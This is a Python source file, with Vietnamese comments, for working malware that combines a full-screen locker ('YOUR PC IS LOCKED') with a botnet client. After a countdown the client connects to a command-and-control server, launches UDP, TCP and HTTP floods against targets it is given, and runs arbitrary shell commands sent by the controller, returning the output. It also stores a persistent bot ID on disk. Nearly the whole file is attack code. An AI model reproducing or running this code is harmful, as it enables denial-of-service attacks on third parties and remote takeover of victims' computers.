import os, sys, socket, threading, time, random, subprocess, tkinter as tk
from tkinter import messagebox

# ================== CONFIG ==================
UNLOCK_KEY    = "kieuquandz"
LOCK_SECONDS  = 60 # Đổi thành 60 giây để test
DELAY_SECONDS = 10 # Chờ 10s trước khi khoá màn hình
C2_HOST       = "127.0.0.1"
C2_PORT       = 4444
C2_PASSWORD   = "botnet-secret-2024"
# ============================================

botnet_started = False
ddos_running   = False
ddos_thread    = None
bot_id         = None
lock_root      = None
entry_var      = None
status_var     = None
time_var       = None
remaining      = [LOCK_SECONDS]

def get_bot_id():
    global bot_id
    if bot_id: return bot_id
    base = os.environ.get("APPDATA") or os.path.expanduser("~")
    d = os.path.join(base, "NyxBot")
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, "id.txt")
    if os.path.exists(p):
        try:
            with open(p, "r") as f:
                v = f.read().strip()
                if len(v) >= 8: bot_id = v; return bot_id
        except OSError: pass
    bot_id = "".join(random.choice("0123456789abcdef") for _ in range(16))
    try:
        with open(p, "w") as f: f.write(bot_id)
    except OSError: pass
    return bot_id

def udp_flood(target, port, dur):
    global ddos_running
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"A" * 1024
        end = time.time() + dur
        while ddos_running and time.time() < end:
            try: s.sendto(payload, (target, port))
            except OSError: pass
        s.close()
    except: pass

def tcp_flood(target, port, dur):
    global ddos_running
    end = time.time() + dur
    while ddos_running and time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1); s.connect((target, port)); s.close()
        except: pass

def http_flood(host, port, dur):
    global ddos_running
    req = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode()
    end = time.time() + dur
    while ddos_running and time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1); s.connect((host, port)); s.sendall(req); s.close()
        except: pass

def stop_ddos():
    global ddos_running, ddos_thread
    ddos_running = False
    if ddos_thread and ddos_thread.is_alive(): ddos_thread.join(timeout=2)
    ddos_thread = None

def start_ddos(method, target, port, dur):
    global ddos_running, ddos_thread
    stop_ddos()
    ddos_running = True
    fn = {"udp": udp_flood, "tcp": tcp_flood, "syn": tcp_flood, "http": http_flood}.get(method, tcp_flood)
    ddos_thread = threading.Thread(target=fn, args=(target, port, dur), daemon=True)
    ddos_thread.start()

def recv_line(sock):
    buf = b""
    while b"\n" not in buf:
        try: c = sock.recv(1)
        except OSError: return ""
        if not c: return ""
        buf += c
        if len(buf) > 4096: break
    return buf.split(b"\n", 1)[0].decode(errors="replace")

def botnet_worker():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15); s.connect((C2_HOST, C2_PORT)); s.settimeout(300)
            s.sendall(f"{C2_PASSWORD}|{get_bot_id()}|windows|py\n".encode())
            if recv_line(s) != "OK": s.close(); time.sleep(5); continue
            while True:
                cmd = recv_line(s)
                if not cmd: break
                parts = cmd.split()
                if not parts: continue
                op = parts[0]
                try:
                    if op == "ping": s.sendall(b"pong\n")
                    elif op in ("udp", "syn", "tcp", "http") and len(parts) >= 4:
                        start_ddos(op, parts[1], int(parts[2]), int(parts[3]))
                        s.sendall(f"started {op}\n".encode())
                    elif op == "stop": stop_ddos(); s.sendall(b"stopped\n")
                    elif op == "exec" and len(parts) >= 2:
                        r = subprocess.run(" ".join(parts[1:]), shell=True, capture_output=True, timeout=60)
                        s.sendall(f"out: {(r.stdout+r.stderr)[:2000].decode(errors='replace')}\n".encode())
                    elif op == "quit": break
                    else: s.sendall(b"unknown\n")
                except Exception as e: 
                    try: s.sendall(f"err: {e}\n".encode())
                    except: break
            s.close()
        except: pass
        time.sleep(10)

def trigger_timeout():
    global botnet_started
    if botnet_started: return
    botnet_started = True
    threading.Thread(target=botnet_worker, daemon=True).start()
    try:
        if lock_root:
            status_var.set("TIME EXPIRED - BOTNET ACTIVE")
            status_var_label.config(fg="red")
            entry_widget.config(state="disabled")
            btn_widget.config(state="disabled")
    except: pass

def try_unlock(event=None):
    if botnet_started: return
    if entry_var.get() == UNLOCK_KEY:
        messagebox.showinfo("OK", "Key correct. Unlocking.")
        os._exit(0)
    else:
        messagebox.showerror("ERROR", "Wrong key.")
        entry_var.set("")

def tick():
    if botnet_started: return
    if remaining[0] > 0:
        remaining[0] -= 1
        m, s = divmod(remaining[0], 60)
        time_var.set(f"Time remaining: {m:02d}:{s:02d}")
        if remaining[0] == 0: trigger_timeout()
        lock_root.after(1000, tick)

def start_locker_ui():
    global lock_root, entry_var, status_var, time_var, status_var_label, entry_widget, btn_widget
    lock_root = tk.Tk()
    lock_root.title("SYSTEM LOCKED")
    lock_root.attributes("-fullscreen", True)
    lock_root.attributes("-topmost", True)
    lock_root.configure(bg="black")
    lock_root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Phím tắt thoát khẩn cấp (Ctrl+Shift+Q) để test
    lock_root.bind("<Control-Shift-Q>", lambda e: os._exit(0))
    lock_root.bind("<Escape>", lambda e: "break")

    tk.Label(lock_root, text="YOUR PC IS LOCKED", fg="red", bg="black", font=("Consolas", 40, "bold")).pack(pady=(100, 20))
    
    time_var = tk.StringVar()
    m, s = divmod(LOCK_SECONDS, 60)
    time_var.set(f"Time remaining: {m:02d}:{s:02d}")
    tk.Label(lock_root, textvariable=time_var, fg="#ffcc00", bg="black", font=("Consolas", 22)).pack(pady=10)

    status_var = tk.StringVar(value="Enter unlock key below:")
    status_var_label = tk.Label(lock_root, textvariable=status_var, fg="#b4b4b4", bg="black", font=("Consolas", 16))
    status_var_label.pack(pady=10)

    entry_var = tk.StringVar()
    entry_widget = tk.Entry(lock_root, textvariable=entry_var, show="*", font=("Consolas", 20), justify="center", bg="#1e1e1e", fg="white")
    entry_widget.pack(pady=10)
    entry_widget.focus_force()

    btn_widget = tk.Button(lock_root, text="UNLOCK", command=try_unlock, font=("Consolas", 18, "bold"), width=12)
    btn_widget.pack(pady=10)

    entry_widget.bind("<Return>", try_unlock)
    lock_root.after(1000, tick)
    lock_root.mainloop()

def main():
    # Delay trước khi hiện màn hình khoá
    print(f"Starting in {DELAY_SECONDS} seconds... Press Ctrl+C to cancel.")
    time.sleep(DELAY_SECONDS)
    start_locker_ui()

if __name__ == "__main__":
    main()
